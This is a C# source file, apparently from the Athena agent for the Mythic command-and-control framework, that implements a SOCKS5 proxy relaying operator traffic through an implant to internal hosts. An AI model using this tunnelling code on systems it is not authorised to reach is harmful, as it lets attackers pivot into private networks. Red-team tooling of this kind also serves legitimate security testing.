using Athena.Commands.Model.Socks;
using Athena.Mythic.Model.Response;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Collections.Concurrent;
using System.Linq;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Commands.Model
{
    public class SocksHandler
    {
        private CancellationTokenSource ct { get; set; }
        private ConcurrentDictionary<int, ConnectionOptions> connections { get; set; }
        public bool running { get; set; }
        public SocksHandler()
        {
            this.running = false;
            this.connections = new ConcurrentDictionary<int, ConnectionOptions>();
        }

        public bool Start()
        {
            try
            {
                this.ct = new CancellationTokenSource();

                //Start Reader Task
                Task.Run(() =>
                {
                    while (true)
                    {
                        //Check each socket to see if it has something available to read.
                        Parallel.ForEach(this.connections, connection =>
                        {
                            try
                            {
                                ReceiveChunk(connection.Value);
                                if (!connection.Value.socket.Connected)
                                {
                                    Console.WriteLine("Socket Disconnected.");
                                    SocksMessage smOut = new SocksMessage()
                                    {
                                        server_id = connection.Value.server_id,
                                        data = "",
                                        exit = true
                                    };
                                    Globals.bagOut[connection.Value.server_id] = smOut;
                                    while(!this.connections.TryRemove(connection));
                                    Console.WriteLine("Removed Connection.");
                                }

                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("Exception in socket read.");
                                Console.WriteLine(e.Message);
                                SocksMessage smOut = new SocksMessage()
                                {
                                    server_id = connection.Value.server_id,
                                    data = "",
                                    exit = true
                                };
                                Globals.bagOut[connection.Value.server_id] = smOut;
                                while (!this.connections.TryRemove(connection)) ;
                                Console.WriteLine("Removed Connection.");
                            }
                        });
                    }
                });

                //Start Sender Task
                Task.Run(() =>
                {
                    //Loop until cancellation is requested.
                    while (!this.ct.IsCancellationRequested)
                    {
                        //Do we have any messages in our queue?
                        if (Globals.bagIn.Count != 0)
                        {
                            /////////////////////////////////////////////////////////////////
                            //I bet I could parallel foreach this to make it slightly faster.
                            /////////////////////////////////////////////////////////////////
                            SocksMessage sm = new SocksMessage();
                            while (!Globals.bagIn.TryTake(out sm)) ;

                            Console.WriteLine(JsonConvert.SerializeObject(sm));
                            if (connections.ContainsKey(sm.server_id))
                            {
                                //We already know about this connection, so let's just forward the data.
                                try
                                {
                                    //Convert datagram to byte[]
                                    byte[] datagram = Misc.Base64DecodeToByteArray(sm.data);

                                    //Check datagram
                                    if (datagram.Length > 0)
                                    {
                                        //Get socket object we created previously
                                        Socket s = this.connections[sm.server_id].socket;

                                        //Forward datagram to endpoint
                                        s.Send(Misc.Base64DecodeToByteArray(sm.data));
                                    }
                                    else
                                    {
                                        //We get an empty datagram for a connection we're currently following.
                                        if (sm.exit)
                                        {
                                            //Datagram is an exit packet from Mythic, let's close the connection, dispose of the socket, and remove it from our tracker.
                                            if (this.connections.ContainsKey(sm.server_id))
                                            {
                                                this.connections[sm.server_id].socket.Disconnect(true);
                                                this.connections[sm.server_id].socket.Close();
                                                this.connections.Take(sm.server_id);
                                            }

                                            //Remove from our tracker
                                            while (!this.connections.TryRemove(this.connections.Where(kvp => kvp.Value.server_id == sm.server_id).FirstOrDefault())) ;
                                            Console.WriteLine("Removed Connection.");

                                            //No reason really to send a response to Mythic
                                        }
                                        //Do I need an else for this? What do we do with empty data packets?
                                    }
                                }
                                catch (SocketException e)
                                {
                                    //We hit an error, let's figure out what it is.
                                    Console.WriteLine("Error Sending Data.");
                                    Console.WriteLine(e.Message);

                                    //Tell mythic that we've closed the connection and that it's time to close it on the client end.
                                    SocksMessage smOut = new SocksMessage()
                                    {
                                        server_id = sm.server_id,
                                        data = "",
                                        exit = true
                                    };

                                    //Add to our messages queue.
                                    Globals.bagOut[sm.server_id] = smOut;

                                    //Remove connection from our tracker.
                                    while (!this.connections.TryRemove(this.connections.Where(kvp => kvp.Value.server_id == sm.server_id).FirstOrDefault())) ;
                                    Console.WriteLine("Removed Connection.");
                                }

                            }
                            else
                            {
                                //This is the first time we've seen this server_id
                                //Convert datagram to byte[]
                                byte[] datagram = Misc.Base64DecodeToByteArray(sm.data);

                                //Check if the datagram is empty.
                                if (datagram.Length > 0)
                                {
                                    //Do we even support this datagram?
                                    if (datagram[0] != (byte)0x05)
                                    {
                                        //Protocol Error, do I need to provide actual information to this?
                                        ConnectResponse cr = new ConnectResponse()
                                        {
                                            status = ConnectResponseStatus.ProtocolError,
                                            //this need to be localhost
                                            bndaddr = new byte[] { 0x7F, 0x00, 0x00, 0x01 },
                                            //this needs to be the bind port
                                            bndport = new byte[] { 0x50, 0x00 },
                                            addrtype = 0x01
                                        };


                                        //We've received an unsupported version header
                                        SocksMessage smOut = new SocksMessage()
                                        {
                                            server_id = sm.server_id,
                                            data = Misc.Base64Encode(cr.ToByte()),
                                            exit = true
                                        };

                                        //Send Response
                                        Globals.bagOut[sm.server_id] = smOut;
                                        //Return an unsupported error
                                    }
                                    else
                                    {
                                        //We do support this datagram, so let's put together out connection object
                                        ConnectionOptions cn = new ConnectionOptions(datagram, sm.server_id);


                                        //TODO SUPPORT FOR BINDING AND UDP STREAMS
                                        switch (datagram[1])
                                        {
                                            case (byte)0x01: //TCP/IP Stream
                                                Console.WriteLine("TCP/IP Stream");
                                                break;
                                            case (byte)0x02: //TCP/IP Port Bind
                                                Console.WriteLine("TCP/IP Bind");
                                                break;
                                            case (byte)0x03: //associate UDP Port
                                                Console.WriteLine("UDP Port");
                                                break;
                                        }

                                        //Did our ConnectionOptions object create properly?
                                        if (cn.socket != null && cn.endpoint != null)
                                        {
                                            try
                                            {
                                                //Attempt to connect to the endpoint.
                                                cn.socket.Connect(cn.endpoint);

                                                //If we made it to here, we've succceeded. Let's let mythic know.
                                                ConnectResponse cr = new ConnectResponse()
                                                {
                                                    status = ConnectResponseStatus.Success,
                                                    bndaddr = cn.bndBytes,
                                                    bndport = cn.bndPortBytes,
                                                    addrtype = cn.addressType
                                                };

                                                //Shove our SOCKS5 message inside of a mythic message.
                                                SocksMessage smOut = new SocksMessage()
                                                {
                                                    server_id = sm.server_id,
                                                    data = Misc.Base64Encode(cr.ToByte()),
                                                    exit = false
                                                };

                                                //Add to our message queue
                                                Globals.bagOut[sm.server_id] = smOut;

                                                //Add the ConnectionsOptions object to our tracker.
                                                //Mostly only down here to prevent us from having to worry about removing it if something happened with adding it to the MythicOut queue
                                                while (!this.connections.TryAdd(sm.server_id, cn)) ;
                                            }
                                            catch (SocketException e)
                                            {
                                                //We failed to connect likely. Why though?
                                                Console.WriteLine("Error connecting to socket.");
                                                Console.WriteLine(e.Message);
                                                ConnectResponse cr = new ConnectResponse()
                                                {
                                                    //this need to be localhost
                                                    bndaddr = new byte[] { 0x00, 0x00, 0x00, 0x00 },
                                                    //this needs to be the bind port
                                                    bndport = new byte[] { 0x00, 0x00 },
                                                    addrtype = 0x00
                                                };

                                                //Get error reason.
                                                switch (e.ErrorCode)
                                                {
                                                    case 10065: //Host Unreachable
                                                        cr.status = ConnectResponseStatus.HostUnreachable;
                                                        break;
                                                    case 10047: //Address Family Not Supported
                                                        cr.status = ConnectResponseStatus.AddressTypeNotSupported;
                                                        break;
                                                    case 10061: //Connection Refused
                                                        cr.status = ConnectResponseStatus.ConnectionRefused;
                                                        break;
                                                    case 10051: //Network Unreachable
                                                        cr.status = ConnectResponseStatus.NetworkUnreachable;
                                                        break;
                                                    case 10046: //Protocol Family Not Supported
                                                        cr.status = ConnectResponseStatus.ProtocolError;
                                                        break;
                                                    case 10043: //Protocol Not Supported
                                                        cr.status = ConnectResponseStatus.ProtocolError;
                                                        break;
                                                    case 10042: //Protocol Option
                                                        cr.status = ConnectResponseStatus.ProtocolError;
                                                        break;
                                                    case 10041: //Protocol Type
                                                        cr.status = ConnectResponseStatus.ProtocolError;
                                                        break;
                                                    case 10060: //Timeout
                                                        cr.status = ConnectResponseStatus.TTLExpired;
                                                        break;
                                                    default: //Everything else
                                                        cr.status = ConnectResponseStatus.GeneralFailure;
                                                        break;
                                                }

                                                //Add to SocksMessage
                                                SocksMessage smOut = new SocksMessage()
                                                {
                                                    server_id = sm.server_id,
                                                    data = Misc.Base64Encode(cr.ToByte()),
                                                    exit = true
                                                };

                                                //Put in out queue
                                                Globals.bagOut[sm.server_id] = smOut;
                                            }
                                        }
                                        //It did not.
                                        else
                                        {
                                            //Get ready to send socks message indicating reason for CONNECT failure
                                            ConnectResponse cr = new ConnectResponse()
                                            {
                                                //this need to be localhost
                                                bndaddr = new byte[] { 0x7F, 0x00, 0x00, 0x01 },
                                                //this needs to be the bind port
                                                bndport = new byte[] { 0x50, 0x00 },
                                                addrtype = 0x01
                                            };

                                            //Couldn't figure out the address family for the request.
                                            if (cn.addressFamily == AddressFamily.Unknown)
                                            {
                                                cr.status = ConnectResponseStatus.AddressTypeNotSupported;
                                            }
                                            //Endpoint could not be resolved.
                                            else if (cn.endpoint is null)
                                            {
                                                cr.status = ConnectResponseStatus.HostUnreachable;
                                            }
                                            //Something else.
                                            else
                                            {
                                                cr.status = ConnectResponseStatus.GeneralFailure;
                                            }

                                            //Shove SOCKS CONNECT response into Mythic Response
                                            SocksMessage smOut = new SocksMessage()
                                            {
                                                server_id = sm.server_id,
                                                data = Misc.Base64Encode(cr.ToByte()),
                                                exit = false
                                            };

                                            //Add it to queue, and we're outta here!
                                            Globals.bagOut[sm.server_id] = smOut;
                                        }
                                    }
                                }
                                else
                                {
                                    //If we get here, it's both an empty datagram and for a connection we're not currently following.
                                    Console.WriteLine("Empty Datagram.");
                                    Console.WriteLine("Should we exit? " + sm.exit);
                                }
                            }
                        }
                        if (this.ct.IsCancellationRequested)
                        {
                            //Cancellation Requested by operator
                            break;
                        }
                    }
                }, this.ct.Token);
                return true;
            }
            catch
            {
                return false;
            }

        }

        public void ReceiveChunk(ConnectionOptions conn)
        {
            SocksMessage smOut;
            byte[] bytes;
            int bytesRec;

            //If you are using a non-blocking Socket, Available is a good way to determine whether data is queued for reading, before calling Receive.
            //The available data is the total amount of data queued in the network buffer for reading. If no data is queued in the network buffer, Available returns 0.
            //https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.socket.available?view=net-5.0
            while (conn.socket.Available != 0)
            {
                //Let's allocate our bytes, either in 512k chunks or less.
                if (conn.socket.Available < 512000)
                {
                    bytes = new byte[conn.socket.Available];
                }
                else
                {
                    bytes = new byte[512000];
                }

                //Receive our allocation.
                bytesRec = conn.socket.Receive(bytes);

                //Append to existing item if it already exists.
                if (Globals.bagOut.ContainsKey(conn.server_id))
                {
                    var item = Globals.bagOut[conn.server_id];
                    byte[] curr = Misc.Base64DecodeToByteArray(item.data);
                    smOut = new SocksMessage()
                    {
                        server_id = conn.server_id,
                        data = Misc.Base64Encode(curr.Concat(bytes).ToArray()),
                        exit = false
                    };
                }
                //Add it to our message queue
                else
                {
                    smOut = new SocksMessage()
                    {
                        server_id = conn.server_id,
                        data = Misc.Base64Encode(bytes),
                        exit = false
                    };
                }
                
                //Send that bad boy off.
                //The "=" for ConcurrentDictionary is the equivalent of AddOrUpdate, so we don't have to worry about the key already/not existing.
                Globals.bagOut[conn.server_id] = smOut;
            }
        }
        public bool Stop()
        {
            try
            {
                this.running = false;
                this.ct.Cancel();
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
